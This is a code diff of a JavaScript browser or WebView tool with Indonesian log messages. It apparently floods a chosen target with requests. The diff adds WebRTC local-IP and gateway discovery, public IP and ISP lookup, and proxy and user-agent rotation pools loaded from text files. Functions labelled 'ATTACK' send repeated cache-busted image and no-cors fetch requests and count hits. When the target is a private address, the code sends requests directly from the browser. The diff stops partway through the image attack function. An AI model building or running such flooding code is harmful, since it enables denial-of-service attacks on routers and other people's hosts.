   function randomSeed() {
     return Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
-  }
-
-  function clamp(n, min, max) {
-    return Math.max(min, Math.min(max, n));
   }
 
   function sanitizePort(input) {
@@ -1814,12 +1705,44 @@ body::after {
     return String(host).trim().replace(/^https?:\/\//, '').replace(/\/.*$/, '');
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 6 — LOGGER
-     ================================================================= */
+  function randomFrom(arr) {
+    if (!Array.isArray(arr) || arr.length === 0) return null;
+    return arr[Math.floor(Math.random() * arr.length)];
+  }
+
+  /* ==========================================================================
+     PRIVATE IP DETECTION
+     ========================================================================== */
+  function isPrivateHostname(hostname) {
+    if (!hostname) return false;
+    var host = String(hostname).replace(/^\[|\]$/g, '').toLowerCase();
+    if (host === 'localhost' || host === '::1') return true;
+
+    var m = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
+    if (m) {
+      var a = parseInt(m[1], 10);
+      var b = parseInt(m[2], 10);
+      if (a === 10) return true;
+      if (a === 172 && b >= 16 && b <= 31) return true;
+      if (a === 192 && b === 168) return true;
+      if (a === 127) return true;
+      if (a === 169 && b === 254) return true;
+      if (a === 0) return true;
+      if (a === 100 && b >= 64 && b <= 127) return true;
+      if (a >= 224) return true;
+      return false;
+    }
+    if (host.startsWith('fc') || host.startsWith('fd')) return true;
+    if (host.startsWith('fe80:')) return true;
+    if (host.endsWith('.local')) return true;
+    return false;
+  }
+
+  /* ==========================================================================
+     LOGGER
+     ========================================================================== */
   function log(level, message) {
     if (!el.consoleBody) return;
-
     var now = new Date();
     var timeStr = formatTime(now);
 
@@ -1832,18 +1755,15 @@ body::after {
 
     el.consoleBody.appendChild(lineEl);
 
-    // Trim DOM
     while (el.consoleBody.children.length > MAX_LOG_LINES) {
       el.consoleBody.removeChild(el.consoleBody.firstChild);
     }
 
-    // Buffer untuk copy
     state.logBuffer.push('[' + timeStr + '] [' + level + '] ' + message);
     while (state.logBuffer.length > MAX_STORED_LOG_LINES) {
       state.logBuffer.shift();
     }
 
-    // Auto scroll
     el.consoleBody.scrollTop = el.consoleBody.scrollHeight;
   }
 
@@ -1856,40 +1776,31 @@ body::after {
 
   function copyLog() {
     var text = state.logBuffer.join('\n');
-    if (!text) {
-      toast('info', 'Log kosong');
-      return;
-    }
+    if (!text) { toast('info', 'Log kosong'); return; }
     if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(text).then(function () {
-        toast('success', 'Log copied ke clipboard');
-      }).catch(function () {
-        fallbackCopyLog(text);
-      });
+        toast('success', 'Log copied');
+      }).catch(function () { fallbackCopy(text); });
     } else {
-      fallbackCopyLog(text);
+      fallbackCopy(text);
     }
   }
 
-  function fallbackCopyLog(text) {
+  function fallbackCopy(text) {
     var ta = document.createElement('textarea');
     ta.value = text;
     ta.style.position = 'fixed';
     ta.style.opacity = '0';
     document.body.appendChild(ta);
     ta.select();
-    try {
-      document.execCommand('copy');
-      toast('success', 'Log copied');
-    } catch (e) {
-      toast('error', 'Copy gagal');
-    }
+    try { document.execCommand('copy'); toast('success', 'Log copied'); }
+    catch (e) { toast('error', 'Copy gagal'); }
     document.body.removeChild(ta);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 7 — TOAST
-     ================================================================= */
+  /* ==========================================================================
+     TOAST
+     ========================================================================== */
   function toast(type, message, durationMs) {
     if (!el.toastContainer) return;
     var icons = {
@@ -1908,13 +1819,13 @@ body::after {
       t.classList.add('hiding');
       setTimeout(function () {
         if (t.parentNode) t.parentNode.removeChild(t);
-      }, 320);
+      }, 300);
     }, dur);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 8 — MODAL
-     ================================================================= */
+  /* ==========================================================================
+     MODAL
+     ========================================================================== */
   function showAlert(title, message, iconClass) {
     if (!el.alertModal) return;
     el.alertTitle.innerHTML =
@@ -1928,59 +1839,49 @@ body::after {
     if (el.alertModal) el.alertModal.classList.remove('active');
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 9 — SCROLL REVEAL (IntersectionObserver)
-     ================================================================= */
+  /* ==========================================================================
+     SCROLL REVEAL
+     ========================================================================== */
   function initReveal() {
     var revealElements = document.querySelectorAll('.reveal');
     if (!revealElements.length) return;
 
     if (typeof IntersectionObserver === 'undefined') {
-      // Fallback: tampilkan semua
-      revealElements.forEach(function (el) { el.classList.add('active'); });
+      for (var i = 0; i < revealElements.length; i++) {
+        revealElements[i].classList.add('active');
+      }
       return;
     }
 
     var observer = new IntersectionObserver(function (entries) {
-      entries.forEach(function (entry) {
+      for (var i = 0; i < entries.length; i++) {
+        var entry = entries[i];
         if (entry.isIntersecting) {
           entry.target.classList.add('active');
         } else {
-          // Hilangkan baris di bawah jika animasi cuma sekali
           entry.target.classList.remove('active');
         }
-      });
+      }
     }, { threshold: 0.1 });
 
-    revealElements.forEach(function (el) { observer.observe(el); });
+    for (var i = 0; i < revealElements.length; i++) {
+      observer.observe(revealElements[i]);
+    }
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 10 — BRIDGE DETECTION (WebView APK)
-     ================================================================= */
+  /* ==========================================================================
+     BRIDGE DETECTION
+     ========================================================================== */
   function detectBridge() {
-    // Nama-nama bridge umum yang sering dipakai di WebView APK
-    var possibleNames = [
-      'Android',
-      'AndroidBridge',
-      'NativeBridge',
-      'WebViewBridge',
-      'AndroidInterface',
-      'JSBridge',
-      'AppBridge',
-      'ReactNativeWebView'
-    ];
-
-    for (var i = 0; i < possibleNames.length; i++) {
-      var name = possibleNames[i];
-      var obj = window[name];
+    var names = ['Android', 'AndroidBridge', 'NativeBridge', 'WebViewBridge', 'AndroidInterface', 'JSBridge', 'AppBridge', 'ReactNativeWebView'];
+    for (var i = 0; i < names.length; i++) {
+      var obj = window[names[i]];
       if (obj && typeof obj === 'object') {
-        state.bridgeName = name;
+        state.bridgeName = names[i];
         state.bridgeAvailable = true;
         return obj;
       }
     }
-
     state.bridgeName = null;
     state.bridgeAvailable = false;
     return null;
@@ -1989,55 +1890,33 @@ body::after {
   function bridgeHasLocationPermission() {
     var bridge = detectBridge();
     if (!bridge) return null;
-
-    // Coba berbagai method umum
     try {
-      if (typeof bridge.hasLocationPermission === 'function') {
-        return bridge.hasLocationPermission() === true;
-      }
+      if (typeof bridge.hasLocationPermission === 'function') return bridge.hasLocationPermission() === true;
       if (typeof bridge.getPermissionStatus === 'function') {
         var s = bridge.getPermissionStatus('LOCATION');
         return s === 'granted' || s === true;
       }
-      if (typeof bridge.checkLocationPermission === 'function') {
-        return bridge.checkLocationPermission() === true;
-      }
-      if (typeof bridge.getLocationPermissionStatus === 'function') {
-        return bridge.getLocationPermissionStatus() === 'granted';
-      }
-      // Bisa juga sebagai property
-      if (typeof bridge.hasLocationPermission !== 'undefined' && typeof bridge.hasLocationPermission !== 'function') {
-        return bridge.hasLocationPermission === true;
-      }
-    } catch (e) {
-      log('WARN', 'Error reading bridge permission: ' + e.message);
-    }
-
+      if (typeof bridge.checkLocationPermission === 'function') return bridge.checkLocationPermission() === true;
+    } catch (e) {}
     return null;
   }
 
-  function bridgeRequestLocationPermission() {
+  function bridgeHasLocalNetworkPermission() {
     var bridge = detectBridge();
-    if (!bridge) return false;
-
+    if (!bridge) return null;
     try {
-      if (typeof bridge.requestLocationPermission === 'function') {
-        bridge.requestLocationPermission();
-        return true;
+      if (typeof bridge.hasLocalNetworkPermission === 'function') return bridge.hasLocalNetworkPermission() === true;
+      if (typeof bridge.getPermissionStatus === 'function') {
+        var s = bridge.getPermissionStatus('LOCAL_NETWORK');
+        return s === 'granted' || s === true;
       }
-      if (typeof bridge.requestPermission === 'function') {
-        bridge.requestPermission('LOCATION');
-        return true;
-      }
-    } catch (e) {
-      log('WARN', 'Error requesting bridge permission: ' + e.message);
-    }
-    return false;
+    } catch (e) {}
+    return null;
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 11 — PERMISSION CHECK (browser + bridge)
-     ================================================================= */
+  /* ==========================================================================
+     PERMISSION STATUS UI
+     ========================================================================== */
   function setPermStatus(elTarget, status, label, icon) {
     if (!elTarget) return;
     elTarget.className = 'perm-status ' + status;
@@ -2061,155 +1940,131 @@ body::after {
   function checkPermission() {
     log('INFO', '=== Checking permissions ===');
 
-    // 1. Deteksi bridge
     var bridge = detectBridge();
-    if (bridge) {
-      log('SUCCESS', 'WebView APK bridge ditemukan: window.' + state.bridgeName);
-    } else {
-      log('INFO', 'Tidak ada WebView APK bridge. Berjalan mode browser.');
-    }
+    if (bridge) log('SUCCESS', 'WebView bridge: window.' + state.bridgeName);
+    else log('INFO', 'No bridge. Mode browser.');
     updateRuntimeBadge();
 
-    // 2. Bridge permission
-    var bridgeGranted = bridgeHasLocationPermission();
-    if (bridgeGranted === true) {
+    var bridgeLoc = bridgeHasLocationPermission();
+    if (bridgeLoc === true) {
       setPermStatus(el.permBridgeStatus, 'granted', 'GRANTED', 'fa-check');
       log('SUCCESS', 'Bridge: location GRANTED');
-    } else if (bridgeGranted === false) {
+    } else if (bridgeLoc === false) {
       setPermStatus(el.permBridgeStatus, 'denied', 'DENIED', 'fa-xmark');
-      log('WARN', 'Bridge: location DENIED');
     } else {
       setPermStatus(el.permBridgeStatus, 'unknown', 'N/A', 'fa-minus');
-      log('INFO', 'Bridge: tidak ada API permission.');
     }
 
-    // 3. Runtime type
     var isWebView = /wv|WebView/i.test(navigator.userAgent) || state.bridgeAvailable;
     state.runtimeType = isWebView ? 'webview' : 'browser';
     setPermStatus(el.permRuntimeStatus, 'granted', isWebView ? 'WEBVIEW' : 'BROWSER', 'fa-circle-check');
 
-    // 4. Location permission (bridge > browser)
-    if (bridgeGranted === true) {
+    // Location
+    if (bridgeLoc === true) {
       state.locationGranted = true;
       setPermStatus(el.permLocationStatus, 'granted', 'GRANTED', 'fa-check');
-      log('SUCCESS', 'Location permission: GRANTED via bridge');
-    } else {
-      // Browser permission
-      if (navigator.permissions && navigator.permissions.query) {
-        navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
-          if (result.state === 'granted') {
-            state.locationGranted = true;
-            setPermStatus(el.permLocationStatus, 'granted', 'GRANTED', 'fa-check');
-            log('SUCCESS', 'Location permission: GRANTED via browser');
-          } else if (result.state === 'denied') {
-            state.locationGranted = false;
-            setPermStatus(el.permLocationStatus, 'denied', 'DENIED', 'fa-xmark');
-            log('WARN', 'Location permission: DENIED via browser');
-          } else {
-            state.locationGranted = false;
-            setPermStatus(el.permLocationStatus, 'asking', 'PROMPT', 'fa-hourglass-half');
-            log('INFO', 'Location permission: belum ditentukan (prompt)');
-          }
-        }).catch(function () {
-          setPermStatus(el.permLocationStatus, 'unknown', 'UNKNOWN', 'fa-question');
-        });
-      } else {
+      log('SUCCESS', 'Location: GRANTED via bridge');
+    } else if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
+        if (result.state === 'granted') {
+          state.locationGranted = true;
+          setPermStatus(el.permLocationStatus, 'granted', 'GRANTED', 'fa-check');
+        } else if (result.state === 'denied') {
+          state.locationGranted = false;
+          setPermStatus(el.permLocationStatus, 'denied', 'DENIED', 'fa-xmark');
+        } else {
+          setPermStatus(el.permLocationStatus, 'asking', 'PROMPT', 'fa-hourglass-half');
+        }
+      }).catch(function () {
         setPermStatus(el.permLocationStatus, 'unknown', 'UNKNOWN', 'fa-question');
-        log('WARN', 'Permissions API tidak tersedia.');
+      });
+    } else {
+      setPermStatus(el.permLocationStatus, 'unknown', 'UNKNOWN', 'fa-question');
+    }
+
+    // Local Network
+    var bridgeLocalNet = bridgeHasLocalNetworkPermission();
+    if (bridgeLocalNet === true) {
+      state.localNetGranted = true;
+      setPermStatus(el.permLocalNetStatus, 'granted', 'GRANTED', 'fa-check');
+      log('SUCCESS', 'Local Network: GRANTED via bridge');
+    } else {
+      // Coba deteksi via connection type
+      var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn && conn.type) {
+        if (conn.type === 'wifi' || conn.type === 'ethernet') {
+          state.localNetGranted = true;
+          setPermStatus(el.permLocalNetStatus, 'granted', 'WIFI/Ethernet', 'fa-check');
+          log('SUCCESS', 'Local Network: OK (WiFi/Ethernet)');
+        } else {
+          setPermStatus(el.permLocalNetStatus, 'unknown', conn.type, 'fa-question');
+        }
+      } else if (navigator.onLine) {
+        // Fallback: asumsikan granted kalau online
+        state.localNetGranted = true;
+        setPermStatus(el.permLocalNetStatus, 'granted', 'AVAILABLE', 'fa-check');
+        log('INFO', 'Local Network: online (asumsi available)');
+      } else {
+        setPermStatus(el.permLocalNetStatus, 'denied', 'OFFLINE', 'fa-xmark');
       }
     }
 
-    // 5. Network status
-    var online = navigator.onLine;
-    if (online) {
+    // Network
+    if (navigator.onLine) {
       setPermStatus(el.permNetworkStatus, 'granted', 'ONLINE', 'fa-wifi');
       log('SUCCESS', 'Network: ONLINE');
     } else {
       setPermStatus(el.permNetworkStatus, 'denied', 'OFFLINE', 'fa-wifi-slash');
-      log('WARN', 'Network: OFFLINE');
     }
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 12 — LOCATION REQUEST
-     ================================================================= */
+  /* ==========================================================================
+     REQUEST LOCATION
+     ========================================================================== */
   function requestLocationPermission() {
     return new Promise(function (resolve) {
-      log('INFO', 'Meminta izin lokasi...');
+      log('INFO', 'Requesting location...');
 
-      // 1. Coba bridge APK dulu
-      var bridgeGranted = bridgeHasLocationPermission();
-      if (bridgeGranted === true) {
+      var bridgeLoc = bridgeHasLocationPermission();
+      if (bridgeLoc === true) {
         state.locationGranted = true;
         setPermStatus(el.permLocationStatus, 'granted', 'GRANTED', 'fa-check');
-        log('SUCCESS', 'Izin lokasi diberikan oleh APK bridge');
         resolve(true);
         return;
       }
-      if (bridgeGranted === false) {
-        log('WARN', 'APK bridge menolak izin. Meminta ke bridge...');
-        var requested = bridgeRequestLocationPermission();
-        if (requested) {
-          // Tunggu user approve, cek ulang setelah 2 detik
-          setTimeout(function () {
-            var recheck = bridgeHasLocationPermission();
-            if (recheck === true) {
-              state.locationGranted = true;
-              setPermStatus(el.permLocationStatus, 'granted', 'GRANTED', 'fa-check');
-              log('SUCCESS', 'Izin lokasi diberikan setelah request');
-              resolve(true);
-            } else {
-              setPermStatus(el.permLocationStatus, 'denied', 'DENIED', 'fa-xmark');
-              resolve(false);
-            }
-          }, 2000);
-          return;
-        }
-      }
 
-      // 2. Fallback browser geolocation
       if (!('geolocation' in navigator)) {
-        log('ERROR', 'Geolocation API tidak tersedia.');
-        setPermStatus(el.permLocationStatus, 'denied', 'N/A', 'fa-xmark');
         resolve(false);
         return;
       }
 
       setPermStatus(el.permLocationStatus, 'asking', 'PROMPT...', 'fa-hourglass-half');
-
       navigator.geolocation.getCurrentPosition(
         function (pos) {
           state.locationGranted = true;
           setPermStatus(el.permLocationStatus, 'granted', 'GRANTED', 'fa-check');
-          log('SUCCESS',
-            'Izin lokasi DIBERIKAN (' +
-            pos.coords.latitude.toFixed(5) + ', ' +
-            pos.coords.longitude.toFixed(5) + ')'
-          );
+          log('SUCCESS', 'Location granted (' + pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4) + ')');
           resolve(true);
         },
         function (err) {
           state.locationGranted = false;
           setPermStatus(el.permLocationStatus, 'denied', 'DENIED', 'fa-xmark');
-          log('ERROR', 'Izin lokasi DITOLAK: ' + err.message);
+          log('ERROR', 'Location denied: ' + err.message);
           resolve(false);
         },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     });
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 13 — WEBRTC LOCAL IP DETECTION
-     ================================================================= */
+  /* ==========================================================================
+     WEBRTC LOCAL IP
+     ========================================================================== */
   function detectLocalIP() {
     return new Promise(function (resolve) {
       var ips = [];
       var resolved = false;
+      var pc = null;
 
       function finish() {
         if (resolved) return;
@@ -2218,25 +2073,13 @@ body::after {
         resolve(ips);
       }
 
-      var pc = null;
       try {
-        if (typeof RTCPeerConnection === 'undefined') {
-          log('WARN', 'WebRTC tidak tersedia.');
-          resolve(ips);
-          return;
-        }
+        if (typeof RTCPeerConnection === 'undefined') { resolve(ips); return; }
         pc = new RTCPeerConnection({ iceServers: [] });
-      } catch (e) {
-        log('WARN', 'WebRTC init error: ' + e.message);
-        resolve(ips);
-        return;
-      }
+      } catch (e) { resolve(ips); return; }
 
       pc.onicecandidate = function (ice) {
-        if (!ice || !ice.candidate) {
-          finish();
-          return;
-        }
+        if (!ice || !ice.candidate) { finish(); return; }
         var candidate = ice.candidate.candidate || '';
         var match = candidate.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
         if (match) {
@@ -2249,24 +2092,17 @@ body::after {
 
       try {
         pc.createDataChannel('probe');
-        pc.createOffer()
-          .then(function (offer) { return pc.setLocalDescription(offer); })
-          .catch(function (err) {
-            log('WARN', 'WebRTC offer error: ' + err.message);
-            finish();
-          });
-      } catch (e) {
-        log('WARN', 'WebRTC error: ' + e.message);
-        finish();
-      }
+        pc.createOffer().then(function (offer) { return pc.setLocalDescription(offer); })
+          .catch(function () { finish(); });
+      } catch (e) { finish(); }
 
       setTimeout(finish, 3500);
     });
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 14 — GATEWAY DERIVATION
-     ================================================================= */
+  /* ==========================================================================
+     GATEWAY
+     ========================================================================== */
   function deriveGateway(localIp) {
     if (!localIp || localIp === '-' || localIp.indexOf('.') === -1) return '-';
     var parts = localIp.split('.');
@@ -2274,35 +2110,116 @@ body::after {
     return parts[0] + '.' + parts[1] + '.' + parts[2] + '.1';
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 15 — NETWORK INFORMATION API
-     ================================================================= */
+  /* ==========================================================================
+     NETWORK INFO API
+     ========================================================================== */
   function loadNetworkInfoAPI() {
     var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
     if (!conn) {
-      state.connType = 'API unavailable';
+      state.connType = 'N/A';
       state.downlink = '-';
       state.rtt = '-';
-      log('WARN', 'Network Information API tidak tersedia.');
       return;
     }
-
-    state.connType = conn.effectiveType || 'unknown';
+    state.connType = conn.effectiveType || conn.type || 'unknown';
     state.downlink = typeof conn.downlink === 'number' ? conn.downlink + ' Mbps' : '-';
     state.rtt = typeof conn.rtt === 'number' ? conn.rtt + ' ms' : '-';
-
-    log('INFO',
-      'NetworkInfo → type=' + state.connType +
-      ' down=' + state.downlink +
-      ' rtt=' + state.rtt +
-      (typeof conn.saveData !== 'undefined' ? ' saveData=' + conn.saveData : '')
-    );
+    log('INFO', 'NetworkInfo → type=' + state.connType + ' down=' + state.downlink + ' rtt=' + state.rtt);
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 16 — UPDATE NETWORK UI
-     ================================================================= */
+  /* ==========================================================================
+     FETCH PUBLIC IP + ISP INFO
+     ========================================================================== */
+  function fetchPublicIPAndISP() {
+    return new Promise(function (resolve) {
+      log('ISP', 'Fetching public IP from ipify...');
+
+      if (el.infoPublicIp) {
+        el.infoPublicIp.textContent = 'Fetching...';
+        el.infoPublicIp.className = 'info-value loading';
+      }
+      if (el.infoIspDevice) {
+        el.infoIspDevice.textContent = 'Fetching...';
+        el.infoIspDevice.className = 'info-value loading';
+      }
+      if (el.infoIspRouter) {
+        el.infoIspRouter.textContent = 'Fetching...';
+        el.infoIspRouter.className = 'info-value loading';
+      }
+
+      // Step 1: get public IP via ipify
+      fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
+        .then(function (res) { return res.json(); })
+        .then(function (data) {
+          var publicIp = data && data.ip ? data.ip : null;
+          if (!publicIp) throw new Error('No IP in ipify response');
+          state.publicIp = publicIp;
+          log('ISP', 'Public IP: ' + publicIp);
+
+          if (el.infoPublicIp) {
+            el.infoPublicIp.textContent = publicIp;
+            el.infoPublicIp.className = 'info-value';
+          }
+
+          // Step 2: get ISP info via ipwho.is
+          return fetch('https://ipwho.is/' + encodeURIComponent(publicIp) + '?fields=ip,success,country,city,connection', { cache: 'no-store' });
+        })
+        .then(function (res) { return res.json(); })
+        .then(function (info) {
+          if (!info || info.success === false) {
+            throw new Error('ipwho.is failed');
+          }
+
+          var conn = info.connection || {};
+          var ispName = conn.isp || conn.org || conn.domain || 'Unknown';
+          var orgName = conn.org || conn.isp || conn.domain || 'Unknown';
+          var asn = conn.asn ? ('AS' + conn.asn) : '';
+
+          // ISP Device = ISP name
+          state.ispDevice = ispName + (asn ? ' (' + asn + ')' : '');
+          // ISP Router = org name (biasanya sama tapi bisa beda format)
+          state.ispRouter = orgName + (asn ? ' (' + asn + ')' : '');
+
+          if (el.infoIspDevice) {
+            el.infoIspDevice.textContent = state.ispDevice;
+            el.infoIspDevice.className = 'info-value isp';
+          }
+          if (el.infoIspRouter) {
+            el.infoIspRouter.textContent = state.ispRouter;
+            el.infoIspRouter.className = 'info-value isp';
+          }
+
+          log('ISP', 'ISP Device: ' + state.ispDevice);
+          log('ISP', 'ISP Router: ' + state.ispRouter);
+
+          resolve({
+            publicIp: publicIp,
+            ispDevice: state.ispDevice,
+            ispRouter: state.ispRouter,
+            country: info.country,
+            city: info.city
+          });
+        })
+        .catch(function (err) {
+          log('ERROR', 'ISP fetch failed: ' + (err && err.message ? err.message : String(err)));
+          state.ispDevice = 'Unknown';
+          state.ispRouter = 'Unknown';
+          if (el.infoIspDevice) {
+            el.infoIspDevice.textContent = 'Unknown';
+            el.infoIspDevice.className = 'info-value error';
+          }
+          if (el.infoIspRouter) {
+            el.infoIspRouter.textContent = 'Unknown';
+            el.infoIspRouter.className = 'info-value error';
+          }
+          resolve({ error: err.message });
+        });
+    });
+  }
+
+  /* ==========================================================================
+     UPDATE NETWORK UI
+     ========================================================================== */
   function updateNetworkUI() {
     if (el.infoIp) {
       el.infoIp.textContent = state.localIp;
@@ -2313,33 +2230,22 @@ body::after {
       el.infoGateway.className = 'info-value' + (state.gateway === '-' ? ' error' : '');
     }
     if (el.infoTarget) {
-      var activeTarget = getActiveTarget();
-      el.infoTarget.textContent = activeTarget || '-';
-      el.infoTarget.className = 'info-value' + (!activeTarget ? ' error' : '');
+      var t = getActiveTarget();
+      el.infoTarget.textContent = t || '-';
+      el.infoTarget.className = 'info-value' + (!t ? ' error' : '');
     }
-    if (el.infoConnType) {
-      el.infoConnType.textContent = state.connType;
-      el.infoConnType.className = 'info-value';
-    }
-    if (el.infoDownlink) {
-      el.infoDownlink.textContent = state.downlink;
-      el.infoDownlink.className = 'info-value';
-    }
-    if (el.infoRtt) {
-      el.infoRtt.textContent = state.rtt;
-      el.infoRtt.className = 'info-value';
-    }
+    if (el.infoConnType) el.infoConnType.textContent = state.connType;
+    if (el.infoDownlink) el.infoDownlink.textContent = state.downlink;
+    if (el.infoRtt) el.infoRtt.textContent = state.rtt;
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 17 — FULL NETWORK REFRESH
-     ================================================================= */
+  /* ==========================================================================
+     REFRESH NETWORK
+     ========================================================================== */
   function refreshNetwork() {
-    log('INFO', '=== Refreshing network info ===');
-
+    log('INFO', '=== Refreshing network ===');
     if (el.refreshNetBtn) el.refreshNetBtn.classList.add('spinning');
 
-    // Reset visual
     if (el.infoIp) { el.infoIp.textContent = 'Detecting...'; el.infoIp.className = 'info-value loading'; }
     if (el.infoGateway) { el.infoGateway.textContent = 'Detecting...'; el.infoGateway.className = 'info-value loading'; }
 
@@ -2350,25 +2256,27 @@ body::after {
         state.localIp = ips[0];
         state.gateway = deriveGateway(state.localIp);
         log('SUCCESS', 'Local IP: ' + state.localIp);
-        log('SUCCESS', 'Gateway (estimasi): ' + state.gateway);
+        log('SUCCESS', 'Gateway: ' + state.gateway);
       } else {
         state.localIp = '-';
         state.gateway = '-';
-        log('WARN', 'IP lokal tidak terdeteksi via WebRTC.');
-        log('WARN', 'Beberapa browser modern pakai mDNS (.local) untuk privasi. Coba WebView APK atau file:// protocol.');
+        log('WARN', 'Local IP not detected via WebRTC.');
       }
-
       updateNetworkUI();
+      checkProxyCompatibility();
       if (el.refreshNetBtn) el.refreshNetBtn.classList.remove('spinning');
+
+      // Lanjut fetch ISP
+      return fetchPublicIPAndISP();
     }).catch(function (err) {
       log('ERROR', 'Refresh error: ' + (err && err.message ? err.message : String(err)));
       if (el.refreshNetBtn) el.refreshNetBtn.classList.remove('spinning');
     });
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 18 — GET ACTIVE TARGET
-     ================================================================= */
+  /* ==========================================================================
+     ACTIVE TARGET
+     ========================================================================== */
   function getActiveTarget() {
     var manual = normalizeHost(el.targetInput ? el.targetInput.value : '');
     if (manual) return manual;
@@ -2389,61 +2297,152 @@ body::after {
     return 'http://' + host + portSuffix;
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 19 — ATTACK METHOD: IMAGE PRELOAD
-     ================================================================= */
-  function sendImage(target, tag) {
-    return new Promise(function (resolve) {
-      var img = new Image();
-      var done = false;
-      var start = performance.now();
+  /* ==========================================================================
+     PROXY COMPATIBILITY
+     ========================================================================== */
+  function checkProxyCompatibility() {
+    var target = getActiveTarget();
+    var isPrivate = isPrivateHostname(target);
+    var proxyOn = el.backendToggle ? el.backendToggle.checked : false;
 
-      function finish(reached, reason) {
-        if (done) return;
-        done = true;
-        try { img.src = ''; } catch (e) {}
-        var elapsed = Math.round(performance.now() - start);
-        if (reached) {
-          log('SUCCESS', '#' + tag + ' [IMG] → ' + target + ' (' + elapsed + 'ms)');
-          state.reached++;
-        } else {
-          log('WARN', '#' + tag + ' [IMG] → ' + target + ' (' + elapsed + 'ms, ' + (reason || 'no-resp') + ')');
-        }
-        updateStats();
-        resolve(true);
+    if (isPrivate && proxyOn) {
+      if (el.backendToggle) el.backendToggle.checked = false;
+      state.useBackend = false;
+
+      if (el.proxyWarning) el.proxyWarning.classList.add('active');
+      if (el.targetInput) el.targetInput.classList.add('error');
+
+      log('WARN', 'Target "' + target + '" is PRIVATE. Backend proxy auto-disabled.');
+      log('INFO', 'Request akan dikirim langsung dari browser.');
+    } else {
+      if (el.proxyWarning) el.proxyWarning.classList.remove('active');
+      if (el.targetInput) el.targetInput.classList.remove('error');
+    }
+  }
+
+  /* ==========================================================================
+     LOAD PROXY.TXT & UA.TXT
+     ========================================================================== */
+  function loadProxyList() {
+    return fetch('proxy.txt', { cache: 'no-store' })
+      .then(function (res) {
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return res.text();
+      })
+      .then(function (text) {
+        var lines = text.split(/\r?\n/)
+          .map(function (l) { return l.trim(); })
+          .filter(function (l) { return l && !l.startsWith('#') && !l.startsWith('//'); });
+        state.proxyList = lines;
+        updatePoolUI();
+        log('INFO', 'proxy.txt loaded: ' + lines.length + ' entries');
+        return lines;
+      })
+      .catch(function (err) {
+        state.proxyList = [];
+        updatePoolUI();
+        log('WARN', 'proxy.txt not loaded: ' + (err && err.message ? err.message : String(err)));
+        return [];
+      });
+  }
+
+  function loadUAList() {
+    return fetch('ua.txt', { cache: 'no-store' })
+      .then(function (res) {
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return res.text();
+      })
+      .then(function (text) {
+        var lines = text.split(/\r?\n/)
+          .map(function (l) { return l.trim(); })
+          .filter(function (l) { return l && !l.startsWith('#') && !l.startsWith('//'); });
+        state.uaList = lines;
+        updatePoolUI();
+        log('INFO', 'ua.txt loaded: ' + lines.length + ' entries');
+        return lines;
+      })
+      .catch(function (err) {
+        state.uaList = [];
+        updatePoolUI();
+        log('WARN', 'ua.txt not loaded: ' + (err && err.message ? err.message : String(err)));
+        return [];
+      });
+  }
+
+  function updatePoolUI() {
+    if (el.proxyCount) {
+      if (state.proxyList.length > 0) {
+        el.proxyCount.textContent = state.proxyList.length + ' ready';
+        el.proxyCount.className = 'proxy-stat-value ok';
+      } else {
+        el.proxyCount.textContent = 'empty';
+        el.proxyCount.className = 'proxy-stat-value empty';
       }
-
-      img.onload  = function () { finish(true, 'load'); };
-      img.onerror = function () { finish(true, 'error-but-real'); };
-
-      try {
-        img.src = target + '/?_=' + randomSeed();
-      } catch (e) {
-        finish(false, 'exception');
+    }
+    if (el.uaCount) {
+      if (state.uaList.length > 0) {
+        el.uaCount.textContent = state.uaList.length + ' ready';
+        el.uaCount.className = 'proxy-stat-value ok';
+      } else {
+        el.uaCount.textContent = 'empty';
+        el.uaCount.className = 'proxy-stat-value empty';
       }
+    }
+  }
 
-      setTimeout(function () { finish(false, 'timeout'); }, 1200);
+  function loadPool() {
+    state.poolLoaded = false;
+    log('INFO', 'Loading proxy.txt & ua.txt...');
+    return Promise.all([loadProxyList(), loadUAList()]).then(function () {
+      state.poolLoaded = true;
+      log('SUCCESS', 'Pool ready: ' + state.proxyList.length + ' proxies, ' + state.uaList.length + ' UAs');
     });
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 20 — ATTACK METHOD: FETCH NO-CORS
-     ================================================================= */
+  /* ==========================================================================
+     ATTACK: IMAGE
+     ========================================================================== */
+  function sendImage(target, tag) {
+    var img = new Image();
+    var done = false;
+    var start = performance.now();
+
+    function finish(reached, reason) {
+      if (done) return;
+      done = true;
+      try { img.src = ''; } catch (e) {}
+      var elapsed = Math.round(performance.now() - start);
+      if (reached) {
+        log('SUCCESS', '#' + tag + ' [IMG] → ' + target + ' (' + elapsed + 'ms)');
+        state.reached++;
+      } else {
+        log('WARN', '#' + tag + ' [IMG] → ' + target + ' (' + elapsed + 'ms, ' + (reason || 'no-resp') + ')');
+      }
+      updateStats();
+    }
+
+    img.onload  = function () { finish(true, 'load'); };
